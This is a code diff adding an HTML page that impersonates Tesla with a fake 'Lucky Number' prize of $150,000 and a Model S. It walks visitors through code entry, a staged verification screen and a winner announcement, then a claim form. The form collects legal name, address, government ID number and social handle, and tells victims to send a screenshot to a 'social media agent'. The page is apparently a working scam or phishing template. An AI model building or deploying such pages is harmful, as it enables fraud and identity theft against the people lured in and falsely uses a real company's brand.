@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Tesla — Lucky Number</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="style.css"/>
+  <style>
+    #loader-screen { display:none; }
+    #winner-screen { display:none; }
+    #prize-section  { display:none; }
+    #prize-success  { display:none; }
+  </style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav id="navbar" class="scrolled">
+  <a class="nav-logo" href="index.html">TESL<span>A</span></a>
+  <div class="nav-links">
+    <a href="shop.html">Vehicles</a>
+    <a href="prize.html" style="color:var(--gold)">Lucky Number</a>
+  </div>
+  <div class="nav-right">
+    <a href="login.html" id="nav-login">Sign In</a>
+    <a href="dashboard.html" id="nav-dash" style="display:none">Dashboard</a>
+    <button class="btn btn-outline" id="nav-logout" style="display:none;padding:.4rem 1rem;font-size:.75rem;">Sign Out</button>
+  </div>
+</nav>
+
+<!-- ═══ SCREEN 1: CODE ENTRY ═══════════════════════════════════ -->
+<div id="lucky-screen" style="min-height:100vh;display:flex;align-items:center;justify-content:center;padding:2rem;
+  background-image:url('https://images.unsplash.com/photo-1617788138017-80ad40651399?w=1400&q=50');
+  background-size:cover;background-position:center;">
+  <div style="position:fixed;inset:0;background:rgba(0,0,0,.78);backdrop-filter:blur(7px);"></div>
+  <div style="position:relative;z-index:2;width:100%;max-width:520px;margin-top:4rem;">
+    <div style="text-align:center;margin-bottom:2.5rem;">
+      <div style="font-size:3.5rem;margin-bottom:.75rem;">🏆</div>
+      <div style="display:inline-block;padding:.3rem .9rem;border:1px solid var(--gold);border-radius:99px;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;color:var(--gold);margin-bottom:1rem;" id="lucky-badge-el">Exclusive Promotion</div>
+      <h1 class="section-title" style="color:var(--gold);" id="lucky-title">Lucky Number</h1>
+      <p class="section-sub" style="margin-top:.75rem;max-width:400px;margin-left:auto;margin-right:auto;" id="lucky-sub">Enter your exclusive reference code. One winner receives $150,000 &amp; a Black Tesla Model S.</p>
+    </div>
+
+    <div class="form-card" style="background:rgba(10,10,10,.92);">
+      <form id="lucky-form" novalidate>
+        <div class="form-group">
+          <label class="form-label" id="lucky-label">Reference Code</label>
+          <input class="form-input" id="lucky-input" type="text" placeholder="e.g. SPE-XXXXXXXXXX"
+            style="text-align:center;letter-spacing:.18em;font-size:1.05rem;font-weight:700;text-transform:uppercase;"/>
+          <p class="form-error" id="err-lucky"></p>
+        </div>
+        <button type="submit" class="btn btn-gold w-full" style="padding:.9rem;font-size:.9rem;" id="lucky-btn-el">Verify Code</button>
+      </form>
+      <p style="font-size:.72rem;color:var(--gray-600);text-align:center;margin-top:1rem;" id="lucky-note">Reference codes are provided by authorised Tesla agents only.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SCREEN 2: PROCESSING LOADER ════════════════════════════ -->
+<div id="loader-screen" style="position:fixed;inset:0;z-index:9999;background:var(--black);display:none;flex-direction:column;align-items:center;justify-content:center;gap:2rem;">
+  <div style="font-size:2.5rem;animation:pulse 1.5s ease-in-out infinite;">🔍</div>
+  <div class="loader-ring"></div>
+  <div style="text-align:center;">
+    <div class="loader-text" id="loader-text">Verifying Reference Code…</div>
+    <div style="font-size:.75rem;color:var(--gray-600);margin-top:.5rem;letter-spacing:.08em;" id="loader-wait">Please do not close this window</div>
+  </div>
+</div>
+
+<!-- ═══ SCREEN 3: WINNER ANNOUNCEMENT ══════════════════════════ -->
+<div id="winner-screen" style="min-height:100vh;display:none;align-items:center;justify-content:center;padding:2rem;
+  background:radial-gradient(ellipse at 50% 30%,#1a1000 0%,#0a0a0a 70%);">
+  <div style="width:100%;max-width:720px;text-align:center;padding-top:5rem;">
+
+    <!-- Animated confetti dots -->
+    <div style="position:fixed;inset:0;pointer-events:none;overflow:hidden;z-index:0;">
+      <div style="position:absolute;width:6px;height:6px;background:var(--gold);border-radius:50%;top:10%;left:20%;animation:confetti1 3s ease-in-out infinite;opacity:.6;"></div>
+      <div style="position:absolute;width:4px;height:4px;background:#fff;border-radius:50%;top:20%;left:70%;animation:confetti2 2.5s ease-in-out infinite .5s;opacity:.4;"></div>
+      <div style="position:absolute;width:8px;height:8px;background:var(--red);border-radius:50%;top:15%;left:45%;animation:confetti1 3.5s ease-in-out infinite 1s;opacity:.5;"></div>
+      <div style="position:absolute;width:5px;height:5px;background:var(--gold);border-radius:50%;top:30%;left:85%;animation:confetti2 2s ease-in-out infinite .2s;opacity:.7;"></div>
+      <div style="position:absolute;width:4px;height:4px;background:#fff;border-radius:50%;top:25%;left:10%;animation:confetti1 4s ease-in-out infinite .8s;opacity:.3;"></div>
+    </div>
+
+    <style>
+      @keyframes confetti1{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-20px) scale(1.2)}}
+      @keyframes confetti2{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-15px) rotate(180deg)}}
+      @keyframes goldPulse{0%,100%{box-shadow:0 0 30px rgba(201,168,76,.3)}50%{box-shadow:0 0 60px rgba(201,168,76,.6)}}
+    </style>
+
+    <div style="position:relative;z-index:2;">
+      <div style="font-size:5rem;margin-bottom:1rem;animation:confetti1 2s ease-in-out infinite;">🏆</div>
+      <div style="font-family:'Rajdhani',sans-serif;font-size:clamp(1.4rem,5vw,2.2rem);font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--gold);margin-bottom:.5rem;" id="w-congrats">Congratulations!</div>
+      <div style="font-size:.9rem;letter-spacing:.15em;text-transform:uppercase;color:var(--gray-400);margin-bottom:.5rem;" id="w-won">You Have Won</div>
+      <div style="font-family:'Rajdhani',sans-serif;font-size:clamp(3rem,10vw,6rem);font-weight:700;
+        background:linear-gradient(135deg,#c9a84c,#fff5c0,#c9a84c);
+        -webkit-background-clip:text;-webkit-text-fill-color:transparent;line-height:1;" id="w-amount">$150,000</div>
+      <div style="font-size:1.1rem;font-weight:600;letter-spacing:.06em;margin:.5rem 0 2rem;color:var(--white);" id="w-prize">+ a Black Tesla Model S</div>
+
+      <!-- Model S Showcase -->
+      <div style="border-radius:12px;overflow:hidden;margin:1.5rem auto;max-width:600px;border:2px solid rgba(201,168,76,.3);animation:goldPulse 2.5s ease-in-out infinite;">
+        <img src="https://images.unsplash.com/photo-1617788138017-80ad40651399?w=900&q=85" alt="Black Tesla Model S" style="width:100%;height:280px;object-fit:cover;"/>
+        <div style="background:linear-gradient(135deg,#0a0600,#1a1000);padding:1rem;border-top:1px solid rgba(201,168,76,.2);">
+          <div style="font-family:'Rajdhani',sans-serif;font-size:1.2rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--gold);">Tesla Model S — Plaid</div>
+          <div style="font-size:.8rem;color:var(--gray-400);margin-top:.25rem;">Midnight Black Metallic · Fully Loaded</div>
+        </div>
+      </div>
+
+      <p style="font-size:.92rem;color:var(--gray-400);line-height:1.8;max-width:500px;margin:0 auto 2rem;" id="w-desc">Your code has been verified. Click below to claim your prize and complete the vehicle claim form.</p>
+
+      <!-- ✅ CTA BUTTON — scrolls to prize form -->
+      <button id="w-cta-btn" onclick="document.getElementById('prize-section').style.display='block';document.getElementById('prize-section').scrollIntoView({behavior:'smooth'});"
+        class="btn btn-gold" style="padding:1.1rem 3rem;font-size:1rem;letter-spacing:.1em;">
+        Click to Claim Your Prize →
+      </button>
+      <p id="w-cta-btn-text" style="font-size:.75rem;color:var(--gray-600);margin-top:.75rem;letter-spacing:.06em;">↓ Scroll down after clicking to see the form</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SCREEN 4: PRIZE CLAIM FORM (below winner on same scroll) ══ -->
+<div id="prize-section" style="display:none;background:linear-gradient(180deg,#0a0600,#0a0a0a);padding:5rem 1.5rem;">
+  <div style="max-width:640px;margin:0 auto;">
+
+    <!-- Model S Header -->
+    <div style="text-align:center;margin-bottom:3rem;">
+      <div style="font-family:'Rajdhani',sans-serif;font-size:2rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--gold);">Tesla Model S</div>
+      <div style="color:var(--gray-400);font-size:.85rem;margin-top:.4rem;">Your prize vehicle — complete the form below</div>
+
+      <!-- Specs row -->
+      <div style="display:flex;justify-content:center;gap:3rem;margin-top:1.5rem;flex-wrap:wrap;">
+        <div style="text-align:center;">
+          <div style="font-size:1.4rem;font-weight:700;font-family:'Rajdhani',sans-serif;color:var(--white);">405 mi</div>
+          <div style="font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--gray-400);">Range</div>
+        </div>
+        <div style="text-align:center;">
+          <div style="font-size:1.4rem;font-weight:700;font-family:'Rajdhani',sans-serif;color:var(--white);">1.99s</div>
+          <div style="font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--gray-400);">0–60 mph</div>
+        </div>
+        <div style="text-align:center;">
+          <div style="font-size:1.4rem;font-weight:700;font-family:'Rajdhani',sans-serif;color:var(--white);">200 mph</div>
+          <div style="font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--gray-400);">Top Speed</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ✅ PRIZE FORM -->
+    <div id="prize-form-wrap" style="background:rgba(10,8,0,.9);border:1px solid rgba(201,168,76,.25);border-radius:12px;padding:2rem;">
+      <div style="font-family:'Rajdhani',sans-serif;font-size:1.6rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;text-align:center;color:var(--gold);margin-bottom:.5rem;" id="pf-title">Prize Claim Form</div>
+      <p style="font-size:.82rem;color:var(--gray-400);text-align:center;margin-bottom:1.5rem;" id="pf-sub">Fill in your details accurately for prize disbursement.</p>
+
+      <form id="prize-form" novalidate>
+        <div class="form-group">
+          <label class="form-label" id="pf-name-lbl">Full Legal Name</label>
+          <input class="form-input" id="prize-name" type="text" placeholder="As on your ID"/>
+        </div>
+        <div class="form-group">
+          <label class="form-label" id="pf-address-lbl">Delivery Address</label>
+          <input class="form-input" id="prize-address" type="text" placeholder="Full address including city & country"/>
+        </div>
+        <div class="form-group">
+          <label class="form-label" id="pf-id-lbl">Government ID Number</label>
+          <input class="form-input" id="prize-id" type="text" placeholder="Passport / National ID"/>
+        </div>
+        <div class="form-group">
+          <label class="form-label" id="pf-social-lbl">Social Media Handle</label>
+          <input class="form-input" id="prize-social" type="text" placeholder="@yourhandle"/>
+        </div>
+        <button type="submit" class="btn btn-gold w-full" style="padding:.9rem;margin-top:.5rem;" id="pf-submit-btn">Submit Prize Claim</button>
+      </form>
+      <p style="font-size:.72rem;color:var(--gray-600);text-align:center;margin-top:1rem;" id="pf-login-note">
+        You must be signed in to submit. <a href="login.html" style="color:var(--gray-400);text-decoration:underline;">Sign in here.</a>
+      </p>
+    </div>
+
+    <!-- ✅ SUCCESS / ORDER CODE -->
+    <div id="prize-success" style="display:none;text-align:center;background:linear-gradient(135deg,#0a0600,#1a1000);border:1px solid var(--gold);border-radius:12px;padding:3rem 2rem;box-shadow:0 0 60px rgba(201,168,76,.18);">
+      <div style="font-size:4rem;margin-bottom:1rem;">🎉</div>
+      <div style="font-family:'Rajdhani',sans-serif;font-size:1.8rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--gold);" id="ps-title">Claim Submitted!</div>
+      <p style="font-size:.85rem;color:var(--gray-400);margin:1rem 0 .5rem;" id="ps-code-label">Your unique Order Code is:</p>
+
+      <!-- ORDER CODE BOX -->
+      <div style="position:relative;display:inline-block;">
+        <div id="prize-order-code" style="
+          font-family:'Rajdhani',sans-serif;font-size:1.9rem;font-weight:700;
+          letter-spacing:.22em;color:var(--gold);
+          background:rgba(201,168,76,.1);
+          border:2px solid var(--gold);border-radius:10px;
+          padding:.9rem 2rem;margin:1rem auto;cursor:pointer;
+          user-select:all;
+        "></div>
+        <div style="font-size:.7rem;color:var(--gray-600);letter-spacing:.08em;margin-top:-.25rem;">Tap to select · Screenshot this code</div>
+      </div>
+
+      <p style="font-size:.88rem;color:var(--white);margin:1.5rem 0 .5rem;font-weight:600;" id="ps-shot">📸 Screenshot this code and share it with your social media agent.</p>
+      <p style="font-size:.82rem;color:var(--gray-400);line-height:1.7;" id="ps-note">Our team will contact you within 24–48 hours to arrange prize delivery.</p>
+
+      <a href="dashboard.html" class="btn btn-gold" style="padding:.85rem 2rem;margin-top:1.5rem;display:inline-flex;" id="ps-dash-btn">View My Dashboard →</a>
+    </div>
+
+  </div>
+</div>
+
+<footer><div class="container"><p>© 2025 Tesla, Inc. All rights reserved.</p></div></footer>
+
+<script type="module">
+  import { initNav, initLucky, initPrizeForm } from './main.js';
+  initNav();
+  initLucky();
+  initPrizeForm();
+</script>
+</body>
+</html>
